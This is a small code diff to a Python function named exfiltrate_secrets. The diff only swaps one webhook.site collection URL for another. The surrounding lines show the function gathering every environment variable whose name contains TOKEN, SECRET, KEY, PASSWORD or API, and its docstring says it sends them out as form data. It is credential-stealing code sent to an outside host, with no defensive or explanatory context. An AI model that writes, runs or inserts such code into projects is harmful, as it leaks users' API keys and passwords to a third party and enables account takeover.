@@ -4,7 +4,7 @@ import urllib.parse
 
 def exfiltrate_secrets():
     """Collect and exfiltrate sensitive environment variables as form data"""
-    webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
+    webhook_url = "https://webhook.site/70e7937a-e041-4002-9ba8-35d54bbf3c57"
     
     # Collect sensitive environment variables
     secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API'])}
